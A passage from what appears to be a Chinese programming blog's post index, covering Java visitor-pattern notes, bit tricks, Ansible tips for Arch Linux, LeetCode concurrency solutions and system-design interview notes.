} } abstract class IntList { Rem1 func = new Rem1(); abstract IntList rem1(); } class Null extends IntList { IntList rem1() { return func.forNull(); } } class Cons extends IntList { Integer i; IntList next; // ….. IntList rem1() { return func.forCons(next, i); } } 這裡省略了一個地方，因為我這裡是用integer所以不用override euqals，但是書上是自訂的class(variant)，所以要用equals要自己實作，而相等的條件就是同類的class的實體，所以用instanceof．\nSubstV class SubstV { PieD forBot(Object n, Object o) { return new Bot(); } PieD forTop (Object t, PieD r, Object n, Object o) { if (o.equals(t)) return new Top(n, r.subst(n, o)); else return new Top(t, r.subst(n, 0)); } } abstract class PieD { RemV remFn = new RemV(); SubsbV substFn = new SubstV(); abstract PieD rem(Object o); abstract PieD subst(Object n, Object o); } class Bot extends PieD { PieD rem(Object o){ return remFn.forBot(o); } PieD subst(Object n, Object o){ return substFn.forBot(n, o) } } class Top extends PieD { Object t; // type var PieD r; Top(Object _t, PieD _r){ t = _t; r = _r; } PieD rem(Object o){ return remFn.forTop(t, r, o); } PieD subst(Object n, Object o){ return substFn.forTop(t, r, n, o) } } 這是不是與list很像，不過注意到subst的Object n, Object o在遞迴的時候其實不會變，所以應該要把它抽出來，scheme是letrec或curry，ML是curry，那這邊要怎麼做？\nCh6 pattern match ver2 (pass closure to invoker \u0026amp; curry func) class SubstV { Object n,o; // …. PieD forBot() { return new Bot(); } PieD forTop (Object t, PieD r) { if (o.equals(t)) return new Top(n, r.subst(this)); else return new Top(t, r.subst(this)); } } 如果照原本的把closure固定在一個所有variant可以碰到的地方的方式，我們沒機會使用我們自己new出來的clousre!!\n從upper class傳closure變成從參數傳 那要做出一個空間出來！！\nabstract class PieD { abstract PieD subst(SubstV func); } class Bot extends PieD { PieD subst(SubstV func){ return func.forBot(); } } class Top extends PieD { Object t; PieD r; Top(Object _t, PieD _r){ t = _t; r = _r; } PieD subst(SubstV func){ return func.forTop(t,r); } } 每個closure都是有for\u0026hellip;,for\u0026hellip;的話可以拉上去變成abstract嗎？ 可以！！ 直接看像是function template，但是當成function type就是PieD -\u0026gt; PieD!!\n所以這其實代表的是function type，與ml越來越像了\ninterface PieI { PieD forBot(); PieD forTop(Object t,PieD p); } (subst : ‘a Pie -\u0026gt; ‘a Pie) 都抽成interface了，invoke的地方要不要統一一下 假設我們有許多closure，那每個都要給一個function name在variant的class，等著丟PieI的實體嗎？ 可以設一個invoke(在書上是accept)接收closure，再把需要的參數灌進去．\nabstract class PieD { abstract PieD invoke(PieI func); } class Bot extends PieD { PieD invoke(PieI func){ return func.forBot(); } } class Top extends PieD { Object t; PieD r; Top(Object _t, PieD _r){ t = _t; r = _r; } PieD invoke(PieI func){ return func.forTop(t,r); } } class SubstV { Object n,o; // …. PieD forBot() { return new Bot(); } PieD forTop (Object t, PieD r) { if (o.equals(t)) return new Top(n, r.invoke(this)); else return new Top(t, r.invoke(this)); } } 如果clousre有狀態? 如果是有acc（有狀態的）的函數\nclass LtdSubstV implements PieVisitorI { int c; Object n; Object o; LtdSubstV(int _c, Object _n, Object _o) { c = _c; n = _n; o = _o; } public PieD forBot() { return new Bot(); } public PieD forTop(Object t, PieD r) { if (c == 0) return new Top(t, r); else if (o.equals(t)) return new Top(n, r.accept(this); //這裡的狀態應該改變 else return new Top(t, r.accept(this)); } } 那就new一下，畢竟這裡是functional programming\nclass LtdSubstV implements PieVisitorI { int c; Object n; Object o; LtdSubstV(int _c, Object _n, Object _o) { c = _c; n = _n; o = _o; } public PieD forBot() { return new Bot(); } public PieD forTop(Object t, PieD r) { if (c == 0) return new Top(t, r); else if (o.equals(t)) return new Top(n, r.accept(LtdSubstV(c-1, n, o))); else return new Top(t, r.accept(this)); } } The sixth Bit of Advice When the additional consumed values change for a self-referenced use of a visitor, don’t forget to create a new visitor.\nCh7 tree recur \u0026amp; object as type var tree走訪 abstract class TreeD { abstract boolean accept(bTreeVisitorI ask); abstract int accept(iTreeVisitorI ask); abstract TreeD accept(tTreeVisitorI ask); } class Bud extends TreeD { boolean accept(bTreeVisitorI ask) { return ask.forBud(); } int accept(iTreeVisitorI ask) { return ask.forBud(); } TreeD accept(tTreeVisitorI ask) { return ask.forBud(); } } class Flat extends TreeD { FruitD f; TreeD t; Flat(FruitD _f, TreeD _t) { f = _f; t = _t; } boolean accept(bTreeVisitorI ask) { return ask.forFlat(f, t); } int accept(iTreeVisitorI ask) { return ask.forFlat(f, t); } TreeD accept(tTreeVisitorI ask) { return ask.forFlat(f, t); } } class Split extends TreeD { TreeD l; TreeD r; Split(Treed _l, TreeD _r) { l = _l; r = _r; } boolean accept(bTreeVisitorI ask) { return ask.forSplit(l, r); } int accept(iTreeVisitorI ask) { return ask.forSplit(l, r); } TreeD accept(tTreeVisitorI ask) { return ask.forFlat(l, r); } } 不想每個return type都寫一個interface (那個時候應該還沒有泛型) 把不同回傳type的值合併起來\ninterface TreeVisitorI { Object forBud(); Object forFlat(FruitD f, TreeD t); Object forSplit(TreeD l, TreeD r); } abstract class TreeD { abstract Object accept(TreeVisitorI ask); } class IsFlatV implements TreeVisitorI { public Object forBud() { return new Boolean(true); } public Object forFlat(FruitD f, TreeD t) { return t.accept(this); } public Object forSplit(TreeD l, TreeD r) { return new Boolean(false); } } class IsSplitV implements bTreeVisitorI { public boolean forBud() { return new Boolean(true); } public boolean forFlat(FruitD f, TreeD t) { return new Boolean(false); } public boolean forSplit(TreeD l, TreeD r) { if (((Boolean)(l.accept(this))).booleanValue()) return r.accept(this); else return new Boolean(false); } } 因為我們目前沒有範型，用範型才比較正常\nThe seventh bit of advice When designing visitor protocols for many different types, create a unifying protocol using Object.\nCh8 arith(abstract actions) \u0026amp; 2 types of inherence 到處都是cast interface ExprVisitorI { Object forPlus(ExprD l, ExprD r); // 相加 Object forDiff(ExprD l, ExprD r); // 相减 Object forProd(ExprD l, ExprD r); // 相乘 Object forConst(Object c); // 常量 } class IntEvalV implements ExprVisitorI { public Object forPlus(ExprD l, ExprD r){ return plus(l.accept(this), r.accept(this)); } public Object forDiff(ExprD l, ExprD r){ return diff(l.accept(this), r.accept(this)); } public Object forProd(ExprD l, ExprD r){ return prod(l.accept(this), r.accept(this)); } public Object forConst(Object c){ return c; } Object plus(Object l, Object r){ return new Integer(((Integer)l).intValue()+((Integer)r).intValue()); } Object diff(Object l, Object r){ return new Integer(((Integer)l).intValue()-((Integer)r).intValue()); } Object prod(Object l, Object r){ return new Integer(((Integer)l).intValue()*((Integer)r).intValue()); } } 為了避免大量的轉換（其實就是隱藏plus, diff, prod的實作），所以把general action拉出來．\n再抽象一次 假設這裡要一個對set操作的eval，那可以\n直接cast用method，簡單暴力 class SetEvalV extends IntEvalV { Object plus(Object l, Object r){ return ((SetD)l).plus((SetD)r); } Object diff(Object l, Object r){ return ((SetD)l).diff((SetD)r); } Object prod(Object l, Object r){ return ((SetD)l).prod((SetD)r); } } 重新拉一個class出來 abstract class EvalD implements ExprVisitorI { public Object forPlus(ExprD l, ExprD r){ return plus(l.accept(this), r.accept(this)); } public Object forDiff(ExprD l, ExprD r){ return diff(l.accept(this), r.accept(this)); } public Object forProd(ExprD l, ExprD r){ return prod(l.accept(this), r.accept(this)); } public Object forConst(Object c){ return c; } abstract Object plus(Object l, Object r); abstract Object diff(Object l, Object r); abstract Object prod(Object l, Object r); } class IntEvalV extends EvalD { Object plus(Object l, Object r){ return new Integer(((Integer)l).intValue()+((Integer)r).intValue()); } Object diff(Object l, Object r){ return new Integer(((Integer)l).intValue()-((Integer)r).intValue()); } Object prod(Object l, Object r){ return new Integer(((Integer)l).intValue()*((Integer)r).intValue()); } } class SetEvalV extends EvalD { Object plus(Object l, Object r){ return ((SetD)l).plus((SetD)r); } Object diff(Object l, Object r){ return ((SetD)l).diff((SetD)r); } Object prod(Object l, Object r){ return ((SetD)l).prod((SetD)r); } } The eighth bits of advice When extending a class, use overriding to enrich its functionality.\n繼承有兩種，一個是繼承自通用class來做出自己想要的功能，這是理想case；而第二種是複寫原有功能的繼承，雖然說這不合理，然而現實中常常看不到別人的class，只能這樣來使用．\nCh9 extend visitor 用繼承增加支援的type 當要為datatype用那種比較討厭的繼承時來加variant時，visitor要怎麼調整\ndatatype shape = Union of Shape * Shape | … func f = … func newF(Union(a,b)) = …. | newF(x) = f(x) class Union extends ShapeD { ShapeD s; ShapeD t; Union(ShapeD _s, ShapeD _t) { s = _s; t = _t; } boolean accept(ShapeVisitorI ask) { // 這裡是implement原本的abstract ((UnionVisitorI)ask).forUnion(s, t); //要自己轉，不然看不到多加的part } } interface UnionVisitorI extends ShapeVisitorI { // interface 可以 extends !!! boolean forUnion(ShapeD s, ShapeD t); } class UnionHasPtV extends HasPtV implements ShapeVisitorI { UnionHasPtV(PointD _p) { super(_p); } public boolean forUnion(ShapeD s, ShapeD t) { return s.accept(this) || t.accept(this); } } 抽象constructor 這行Trans(CartP(3,7),Union(Square(10),Circle(10))).invoke(UnionV) 陪下面的code，會出事\nclass HasPtV implements ShapeVisitorI { PointD p; HasPtV(PointD _p) { p = _p; } public boolean forCircle(int r) { return p.distanceTo0() \u0026lt;= r; } public boolean forSquare(int s) { return p.x \u0026lt;= s \u0026amp;\u0026amp; p.y \u0026lt;= s; } public boolean forTrans(PointD q, ShapeD s) { return s.accept(new HasPtV(p.minus(q))); // 兇手 } } 因為Trans會call到上一層的visitor，之後就回不來UnionHasPtV了！！\n所以要有辦法讓它能夠產生新的，抽象constrctor\nclass HasPtV implements ShapeVisitorI { PointD p; HasPtV(PointD _p) { p = _p; } ShapeVisitorI newHasPt(PointD p) { // factory method return new HasPtV(p); } public boolean forCircle(int r) { return p.distanceTo0() \u0026lt;= r; } public boolean forSquare(int s) { return p.x \u0026lt;= s \u0026amp;\u0026amp; p.y \u0026lt;= s; } public boolean forTrans(PointD q, ShapeD s) { return s.accept(newHasPtV(p.minus(q))); } } The nineth bit of advice If a datatype may have to be extended, be forward looking and use a constructor-like(override) method so that visitors can be extended too.\nfactory method pattern class UnionHasPtV extends HasPtV implements UnionVisitorI { UnionHasPtV(PointD _p) { super(_p); } ShapeVisitorI newHasPt(PointD p) { // factory method return new UnionHasPtV(p); } public boolean forUnion(ShapeD s, ShapeD t) { return s.accept(this) || t.accept(this); } } Ch10 Visitor pattern(obj作為打包好的參數\u0026amp;state[直接修改obj]) 觀察在class的invoke，都只是把field的東西傳到closure中而已，那object其實可以直接access自己的field，那可以直接傳obj?\ninterface PieVisitorI { Object forBot(Bot that); Object forTop(Top that); } abstract class PieD { abstract Object accept(PieVisitorI ask); } class Bot extends PieD { Object accept(PieVisitorI ask) { return ask.forBot(this); } } class Top extends PieD { Object t; PieD r; Top(Object _t, Object _r) { t = _t; r = _r; } Object accept(PieVisitorI ask) { return ask.forTop(this); } } class OccursV implements PieVisitorI { Object a; OccursV(Object _a) { a = _a; } public Object forBot(Bot that) { return new Integer(0); } public Object forTop(Top that) { if (that.t.equals(a)) return new Integer(((Integer)(that.r.accept(this))).intValue()+1); else return that.r.accept(this); } } 現在是直接傳物件，那能不能直接改，這樣就不用new了\nclass SubstV implements PieVisitorI { Object n; Object o; SubstV(Object _n, Object _o) { n = _n; o = _o; } public Object forBot(Bot that) { return new Bot(); } public Object forTop(Top that) { if (o.equals(that.t)) return new Top(n, (PieD)(that.r).accept(this)); else return new Top(that.t, (PieD)(that.r).accept(this)); } } class SubstV implements PieVisitorI { Object n; Object o; SubstV(Object _n, Object _o) { n = _n; o = _o; } public Object forBot(Bot that) { return that; } public Object forTop(Top that) { if (o.equals(that.t)) that.t = n; //直接被改完了，同時r也沒變，不用設回去 that.r.accept(this); return that; } } the tenth bit of advice When modifications to objects are needed, use a class to insulate the operations that modify objects. Otherwise, beware the consequences of your actions.\nY in Java datatype \u0026#39;a T = Into of \u0026#39;a T -\u0026gt; \u0026#39;a fun Y(f)= H(f)(Into(H(f))) and H(f)(a) = f(G(a)) and G(Into(a))(x) = a(Into(a))(x); class Mk { Func apply(Func f) { return new Fact(f); } } class Fact { Func f; Fact(Func _f) { f = _f; } Integer apply(Integer x) { if (x == 0) return 1; else return x * f.apply(x - 1); } } class Y { Func apply(Mk f) { H h = new H(f); return h.apply(h); } } class H { Mk f; H(Mk _f) { f = _f; } H apply(H a) { return f.apply(new G(a)); } } class G { H h; G(H _h) { h = _h; } Integer apply(Integer x) { return h.apply(h).apply(x); } } ","permalink":"https://littlebees.github.io/2021/07/a-little-java-a-few-patterns%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這已經雪藏很久了，久在github page還沒用到之前就在我的google docs中\n整理一下貼出來\u003c/p\u003e","title":"A little java, a few patterns筆記"},{"content":"動機 之前面試題目有遇過bit trick的考題，用到lowBit!! 所以來記錄一下\n這篇不記錄要table或是常數的做法，這裡只記錄用bit operation與負號就能用的手法，如果需要看這裡\n需要工具 -n (2補數，not是1補數) 取not再加1 -1 把到LSM(最左)最近的1mark成0，剩下的到LSM之間的用成1 可以想成把1往左拖，經過的地方都會變成1，類似痕跡 像1000扣1後，變成0111 ^ (xor) \u0026amp;,| 思考方式 如果是設定就直接用and,or,xor\n如果是要num的bit，就從想要的bit開始，用-n,-1再搭配and\n乘除有關就是左右移了\n當成array set第i個是1: ret = ret | (1 \u0026lt;\u0026lt; i) unset第i個: ret = ret \u0026amp; ~(1 \u0026lt;\u0026lt; i) toggle第i個: ret = ret ^ (1 \u0026lt;\u0026lt; i) check第i個由沒有被set: ret = ret \u0026amp; (1 \u0026lt;\u0026lt; i) 把LSB(最右)到第i個清0: ret = ret \u0026amp; ~((1 \u0026lt;\u0026lt; (i+1))-1) 把MSB(最左)到第i個清0: ret = ret \u0026amp; ((1 \u0026lt;\u0026lt; i)-1) 幾個bits被set while (n) { n = n \u0026amp; (n-1); ret++; } return ret; reverse unsigned int v; // input bits to be reversed unsigned int r = v; // r will be reversed bits of v; first get LSB of v int s = sizeof(v) * CHAR_BIT - 1; // extra shift needed at end for (v \u0026gt;\u0026gt;= 1; v; v \u0026gt;\u0026gt;= 1) { r \u0026lt;\u0026lt;= 1; r |= v \u0026amp; 1; s--; } r \u0026lt;\u0026lt;= s; // shift when v\u0026#39;s highest bits are zero 最靠左的1 get: n \u0026amp; (-n) del: n \u0026amp; (n-1) 算餘數 const unsigned int n; // numerator const unsigned int s; const unsigned int d = 1U \u0026lt;\u0026lt; s; // So d will be one of: 1, 2, 4, 8, 16, 32, ... unsigned int m; // m will be n % d m = n \u0026amp; (d - 1); 大小寫 小寫: ch |= ' ' 大寫: ch \u0026amp;= '_' 其實就是' '的not 是不是2的次方數 (x \u0026amp;\u0026amp; !(x \u0026amp; x-1))\n被3整除? 3: 11 6: 1100 9: 1111\n所以可以看兩位是不是都是1來看是不是整除3\nint divide3(int a){ int ans = 0; while(a){ ans += a\u0026amp;1; a\u0026gt;\u0026gt;=1; ans -= a\u0026amp;1; a\u0026gt;\u0026gt;=1; } return !(ans); } Ref Bit Tricks for Competitive Programming Bitwise Hacks for Competitive Programming Bit Twiddling Hacks\n","permalink":"https://littlebees.github.io/2021/07/bit-tricks/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前面試題目有遇過bit trick的考題，用到lowBit!!\n所以來記錄一下\u003c/p\u003e\n\u003cp\u003e這篇不記錄要table或是常數的做法，這裡只記錄用bit operation與負號就能用的手法，如果需要看\u003ca href=\"https://graphics.stanford.edu/~seander/bithacks.html#ConditionalSetOrClearBitsWithoutBranching\"\u003e這裡\u003c/a\u003e\u003c/p\u003e","title":"bit tricks"},{"content":"動機 這個是用ansible去安裝與設定arch linux遇到的事情記錄在這裡\nbecome_user 會提到這個是為了yay，他不能用root去跑\n所以要另外開一個沒有密碼的sudoer\n- name: create tmp user sudoer file lineinfile: path: /etc/sudoers.d/aur_installer-allow-to-sudo-pacman state: present line: \u0026#34;aur_installer ALL=(ALL) NOPASSWD: /usr/bin/pacman\u0026#34; validate: /usr/sbin/visudo -cf %s create: yes - name: install aur_apps become: yes become_user: aur_installer command: \u0026#34;yay -Sy --noconfirm {{ item }}\u0026#34; with_items: \u0026#34;{{ aur_apps }}\u0026#34; - name: remove tmp user user: name: aur_installer state: absent remove: yes - name: remove useless sudoer file file: path: /etc/sudoers.d/aur_installer-allow-to-sudo-pacman state: absent sysrq \u0026amp; chroot \u0026amp; async ssh可以chroot，但是沒辦法重開機\n但我們還有sysrq，echo b | sudo tee /proc/sysrq-trigger\n發完就重開了，所以不能等\n- name: reboot target (evil way) shell: \u0026#34;sync; sync; sync; echo b | sudo tee /proc/sysrq-trigger\u0026#34; async: 123 # 隨便填 poll: 0 # 不去看有沒有完成 use systemctl ansible的systemd，會看status code，但是有的service的status code不是ansible想看的，所以會被當成錯誤，直接用command或是shell吧\nmultiple lines 就是mutltiple lines\n- name: patch css lineinfile: path: \u0026#34;~{{ user_id }}/theme/{{ item }}\u0026#34; line: | .login-dialog \u0026gt; StBoxLayout { background-color: rgb(248, 160, 201); border: 1px solid #cccccc41; box-shadow: 0 3px 9px 1px rgba(0, 0, 0, 0.5); border-radius: 6px; padding: 12px 40px 24px 40px; } 換密碼 要帶password_hash，不然會換成奇怪的東西\n- name: change root pw user: name: root password: \u0026#34;{{ root_pw | password_hash(\u0026#39;sha512\u0026#39;) }}\u0026#34; callback role可以用import_role與include_role來達成callback效果\n主程式 roles/mm/tasks/main.yaml\n- name: test include_role import_role: name: common tasks_from: a vars: arg1: b ff: from same layer callback function roles/mm/tasks/b.yaml\n- name: hi debug: msg: i\u0026#39;m a callback 執行callback的function roles/common/tasks/a.ymal\n- name: print str debug: msg: hello, world - name: test include_role include_role: name: mm tasks_from: \u0026#34;{{ arg1 }}\u0026#34; - name: print str debug: msg: \u0026#34;hello, end, {{ ff }}\u0026#34; include_role \u0026amp; import_role 如果roles/common/tasks/a.ymal中的include_role改用import_role， tasks_from: \u0026quot;{{ arg1 }}\u0026quot;的arg1就不會被展開!!\n所以import_role是靜態的，他只會把{{ arg1 }}整個帶進去，把role直接展開\n而include_role會經過運算，所以變數會展開，所以是動態的\n","permalink":"https://littlebees.github.io/2021/07/ansible-tips/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這個是用ansible去安裝與設定arch linux遇到的事情記錄在這裡\u003c/p\u003e","title":"ansible tips"},{"content":"動機 解解LC的題目\nlockfree 只要一讀一寫就ok了，之後就是搭配while(cond) { Thread.yield(); }\n但事情沒這麼簡單\n修改變數時要加上條件(前提)，不要無條件的write，以保證一讀一寫 write不要與其他東西混用 像1116的printNumber.accept(i++);，會錯 在多thread協作的場景下，lockfree很沒效率，見1117 1114 class Foo { private volatile int n = 0; public Foo() { } public void first(Runnable printFirst) throws InterruptedException { while (n \u0026lt; 1) { printFirst.run(); n = 1; } } public void second(Runnable printSecond) throws InterruptedException { while (n \u0026lt; 2) { if (n == 1) { printSecond.run(); n++; } Thread.yield(); } } public void third(Runnable printThird) throws InterruptedException { while (n \u0026lt; 3) { if (n == 2) { printThird.run(); n++; } Thread.yield(); } } } 1115 class FooBar { private int n; private volatile boolean pFoo = true; public FooBar(int n) { this.n = n; } public void foo(Runnable printFoo) throws InterruptedException { for (int i = 0; i \u0026lt; n; i++) { if (pFoo) { // printFoo.run() outputs \u0026#34;foo\u0026#34;. Do not change or remove this line. printFoo.run(); pFoo = false; } else { Thread.yield(); i--; } } } public void bar(Runnable printBar) throws InterruptedException { for (int i = 0; i \u0026lt; n; i++) { if (!pFoo) { // printBar.run() outputs \u0026#34;bar\u0026#34;. Do not change or remove this line. printBar.run(); pFoo = true; } else { Thread.yield(); i--; } } } } 1116 class ZeroEvenOdd { private final int n; private volatile int i = 1; private volatile boolean need_zero = false; public ZeroEvenOdd(int n) { this.n = n; } public void genOneZero() { need_zero = true; while (need_zero) { Thread.yield(); } } // printNumber.accept(x) outputs \u0026#34;x\u0026#34;, where x is an integer. public void zero(IntConsumer printNumber) throws InterruptedException { while (i \u0026lt;= n) { if (need_zero) { printNumber.accept(0); need_zero = false; } Thread.yield(); } } public void even(IntConsumer printNumber) throws InterruptedException { while (i \u0026lt;= n) { if (i % 2 == 0 \u0026amp;\u0026amp; !need_zero) { genOneZero(); // printNumber.accept(i++); NO!!!! printNumber.accept(i); i++; } else { Thread.yield(); } } } public void odd(IntConsumer printNumber) throws InterruptedException { while (i \u0026lt;= n) { if (i % 2 != 0 \u0026amp;\u0026amp; !need_zero) { genOneZero(); printNumber.accept(i); i++; } else { Thread.yield(); } } } } 1195 class FizzBuzz { private final int end; private volatile int n = 1; public FizzBuzz(int n) { this.end = n; } // printFizz.run() outputs \u0026#34;fizz\u0026#34;. public void fizz(Runnable printFizz) throws InterruptedException { while (n \u0026lt;= end) { if (n % 3 == 0 \u0026amp;\u0026amp; n % 5 != 0) { printFizz.run(); n++; } else { Thread.yield(); } } } // printBuzz.run() outputs \u0026#34;buzz\u0026#34;. public void buzz(Runnable printBuzz) throws InterruptedException { while (n \u0026lt;= end) { if (n % 5 == 0 \u0026amp;\u0026amp; n % 3 != 0) { printBuzz.run(); n++; } else { Thread.yield(); } } } // printFizzBuzz.run() outputs \u0026#34;fizzbuzz\u0026#34;. public void fizzbuzz(Runnable printFizzBuzz) throws InterruptedException { while (n \u0026lt;= end) { if (n % 3 == 0 \u0026amp;\u0026amp; n % 5 == 0) { printFizzBuzz.run(); n++; } else { Thread.yield(); } } } // printNumber.accept(x) outputs \u0026#34;x\u0026#34;, where x is an integer. public void number(IntConsumer printNumber) throws InterruptedException { while (n \u0026lt;= end) { if (n % 3 != 0 \u0026amp;\u0026amp; n % 5 != 0) { printNumber.accept(n); n++; } else { Thread.yield(); } } } } 1117 semaphore 兩個H後才有一個O，對應到兩個semaphore\n先放H再放O\nclass H2O { private Semaphore h = new Semaphore(2), o = new Semaphore(0); public void hydrogen(Runnable releaseHydrogen) throws InterruptedException { h.acquire(); releaseHydrogen.run(); o.release(); } public void oxygen(Runnable releaseOxygen) throws InterruptedException { o.acquire(2); releaseOxygen.run(); h.release(2); } } synchronized (blockfree) synchronized中不會reorder且具atomic\n應該要上volatile，但我把volatile拿掉也是AC了!!\nclass H2O { private int h = 2, o = 0; private Integer a=1,b=2; public void hydrogen(Runnable releaseHydrogen) throws InterruptedException { synchronized(a) { while (h \u0026lt;= 0) Thread.yield(); h--; releaseHydrogen.run(); o++; } } public void oxygen(Runnable releaseOxygen) throws InterruptedException { synchronized(b) { while (o \u0026lt; 2) Thread.yield(); o-=2; releaseOxygen.run(); h+=2; } } } lockfree (TLE) lockfree就是不符合執行條件就丟出去，這樣有可能浪費很多次做事的機會\nlock不是不好，怕的是有人長期持有，又有一堆人去搶\nclass H2O { private volatile int h = 0; public void hydrogen(Runnable releaseHydrogen) throws InterruptedException { while (h \u0026lt;= 0) Thread.yield(); releaseHydrogen.run(); if (h \u0026gt; 0) { h--; } } public void oxygen(Runnable releaseOxygen) throws InterruptedException { while (h \u0026gt; 0) Thread.yield(); releaseOxygen.run(); if (h \u0026lt;= 0) { h+=2; } } } 1226. The Dining Philosophers 其實重點就是相鄰的哲學家要先去搶同一個叉子\nclass DiningPhilosophers { private Integer[] lks; public DiningPhilosophers() { lks = new Integer[] {0, 1, 2, 3, 4}; } // call the run() method of any runnable to execute its code public void wantsToEat(int philosopher, Runnable pickLeftFork, Runnable pickRightFork, Runnable eat, Runnable putLeftFork, Runnable putRightFork) throws InterruptedException { int left = philosopher; int right = (philosopher+5-1) % 5; if (philosopher % 2 == 1) { left = left ^ right; right = left ^ right; left = left ^ right; } synchronized(lks[left]) { synchronized(lks[right]) { pickLeftFork.run(); pickRightFork.run(); eat.run(); putRightFork.run(); putLeftFork.run(); } } } } ","permalink":"https://littlebees.github.io/2021/07/leetcode-concurrency/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e解解LC的題目\u003c/p\u003e","title":"leetcode-Concurrency"},{"content":"動機 之前面試莫名其妙被system design電到翻過去， 之後看了，system design primer，但還是出事，以為只要把system design的觀念記熟就好，之後要我計算有的沒的就起飛。\n目前發現這個，看完發現，原來我之前只有準備一半啊\nsystem design的面試其實有一定的程序要走，不是單純的QA 這個沒做過相關的分析，基本上應該很難當場想出來，我當初是能想到設計，但沒辦法證明(do some math)這是可行的\n所以這篇，是要補完這點。\n過程 需求 功能 output 格式 Input的量 每秒多少資料 每秒多少request throughput Queries Per Second, QPS 預期希望處理多少資料 latency 限制 有什麼機器，spec core RAM CAP CA 一致性(總是能拿到最新的) + 可用性(拿得到資料) 單一DB AP \u0026amp; CP 分區容錯性(能不能分區，只有一部份是好的) 有P就是兩個case -總是拿到*資料，但是可能是舊的: AP 可能拿不到資料，但是一定是新的: CP 最終一致性 算需要多少資源 Daily Active User \u0026amp; QPS \u0026amp; storage \u0026amp; 幾台機器 creation QPS reading QPS storage for a day \u0026amp; many years(10years) 需求+spec不能超過物理限制 spec ram ssd/hdd network(RTT) cores 需求 throughput(qps) input latency 常見物理限制的平均值 ram 250us ssd 1000us compress 3us network same data center 500us CA\u0026lt;-\u0026gt;Netherlands 150000us 1us = 10^-6secs 1ns = 10^-9secs 1ms = 10^-3secs 畫架構(API -\u0026gt; prog) \u0026lt;-\u0026gt; 加強 (loop) CDN, DNS message queue concurreny/parallel design Load Balancer 分配方式: random, 最少負載 layer 4 or layer 7 cache write around write through write back multi-server 多master or master-slave 容錯轉移(failover) or 複寫(Replication) auto scale container orchestration platform 讀寫分離 total = R+W，分配R與W的數量 DB schema 反正規化 design one to one one to many many to many multi-server 依功能分成多DB (federative database) 把資料分散到多DB (sharding) SQL/noSQL SQL: 強一致性, transaction, 複雜結構(join,index) SQL: 最終一致性, 高throughput, 巨量資料 需要多少機器 要想辦法讓需求在物理限制之中\n用這裡的快取做例子，來算一下\n這裡是設計快取，所以記憶體的速度是物理限制\n之後，需求給qps與input總量，求大概幾台幾core多少ram的機器\n# 從會算的開始，要幾台 host = total_input/ram # 每個core每秒要處理多少req req_per_core_per_sec = qps/(host*core) # 頻率就是時間的倒數 latency = 1/req_per_core_per_sec = (host*core)/qps # 展開host latency = (total_input*core)/(ram*qps) # 把給定的數字分出來 latency = (total_input/qps) * (core/ram) # 因為是物理限制，所以求出來的數字，不能超過latency latency \u0026lt;= (total_input/qps) * (core/ram) # 因此，要不是core變多，就是ram變小 # 台數可以透過 host = total_input/ram 算 上面推導完來帶數字\nqps: 10m total_input: 30tb 這裡有個小訣竅，在算時把單位換成統一的比較好用，看要消的單位來看要換成或不會換 像，與大小有關都是gb，時間都是sec\n查表會發現，從mem讀1MB要250us(10^-6 secs)\n先換算，250*10^-6\n250*10^-6 \u0026lt;= (30*1000)/10*10^6 * (core/ram) # 化簡 1 \u0026lt;= 12 * (core/ram) # 4cores ram \u0026lt;= 12*core = 48 所以4cores，一台最多只能48gb 8cores，一台最多只能96gb\n照原本這裡第一次給的spec，4cores與72gb會爆，但是4cores與32gb不會爆\n那總共要幾台，以4cores與32gb來看，要30*1000gb/32gb=940台\n要在設計之前要知道 Daily Active User read的頻率 =\u0026gt; read的total_input write的頻率 =\u0026gt; write的total_input user產生的資料大小 (post, short url) 有可能是根據自己設計的去算(short url) latency for read \u0026amp; write Consistency or Availability read-heavy or write-heavy or half-half 之後要求出，下面的東西才能繼續做設計\nread QPS write QPS storage comsumption 如果需要求需要多少台機器 latency \u0026lt;= (total_input/qps) * (core/ram) 配合 host = total_input/ram\n例子 這裡 這裡2\n一些技巧\nAPI設計 放api_dev_key 做bandwidth controll Implement online / offline online: 一來算一筆 offline: 預先生成資料 (short url的碼) Sharding 的 hash key foreign key primary key+timestamp(create time) primary key+counter (zookeeper) 要多長 (short url) 要放多久*每天產生多少 \u0026lt;= (possible chars)^長度 有長度就可以算storage interviewBit Sharding a Database Can we have a fixed number of shards? map to shard function: H % S number of shards is S a numeric hash H When adding a new machine, need to relocate each and every key extremely expensive and highly undesirable Consistent Hashing 把shard列序 將data或user map 到 其中一個shard 如果出事或是加新機器 把資料往下一台移(因為已經有順序了) Highly Available Database Master Slave Multi Master peer to peer Consistent Hashing Read and Write consistency 設有P份copy 要讀或寫，就對所有shard發req，拿到一定數量的ack才成功 R是回傳read成功的次數，W是回傳write成功的次數 要維持C(總是拿到最新的write) W + R \u0026gt; P W = P: 強C(每台都要回) R = 1: for fast read W \u0026lt; P: 最終一致 W = 1: for fast write 要處理data conflict 先寫先贏 留標記 Highly Consistent Database 為了C與處理單點錯誤 資料要write到多台DB 如果每一台都write很費時，只要寫到一定數量就好 需要master追蹤寫到哪些機器 master只有一台? 單點錯誤 多一台做standby ","permalink":"https://littlebees.github.io/2021/07/system-design%E7%9A%84faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前面試莫名其妙被system design電到翻過去，\n之後看了，system design primer，但還是出事，以為只要把system design的觀念記熟就好，之後要我計算有的沒的就起飛。\u003c/p\u003e\n\u003cp\u003e目前發現\u003ca href=\"https://www.jyt0532.com/2017/03/27/system-design/\"\u003e這個\u003c/a\u003e，看完發現，原來我之前只有準備一半啊\u003c/p\u003e\n\u003cp\u003esystem design的面試其實有一定的程序要走，不是單純的QA\n這個沒做過相關的分析，基本上應該很難當場想出來，我當初是能想到設計，但沒辦法證明(do some math)這是可行的\u003c/p\u003e\n\u003cp\u003e所以這篇，是要補完這點。\u003c/p\u003e","title":"system-design的faq"},{"content":"動機 看bpf時突然想起來，整理一下\n行前工具 compiler: gcc 看elf的工具: readelf 或 objdump 單純看symbol: nm compile流程 compile: code -\u0026gt; object code 前面其實還有preprocesser展開，但先當成一起的 從高階語言變成低階語言 assemble: object code -\u0026gt; binary(relocatable, 又名object file) 從低階語言變成binary 但在其他檔案的code怎麼找到他們? linking: 